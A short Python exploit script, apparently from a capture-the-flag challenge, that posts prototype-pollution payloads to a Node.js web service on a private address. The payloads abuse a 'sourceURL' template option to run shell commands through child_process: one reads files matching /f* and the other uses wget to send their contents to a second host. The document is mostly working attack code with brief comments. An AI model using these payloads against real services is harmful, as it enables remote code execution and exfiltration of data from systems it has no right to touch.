import requests

url = "http://192.168.65.132:8086/"

#Don't know what reason, must use execSync and can't getshell
data_1 = {"__proto__" : {"sourceURL" : "1;\r\nreturn hacker = () => {return global.process.mainModule.require('child_process').execSync('cat /f*').toString();};//"}}

#but u can use exec and wget to get flag
data_2 = {
    "__proto__":{
        "sourceURL": "1;\r\n global.process.mainModule.constructor._load('child_process').exec('wget http://192.168.65.128:233/$(cat /f*)');//"
    }
}


#pollution
rq = requests.post(url = url, json = data_1)
print(rq.text)





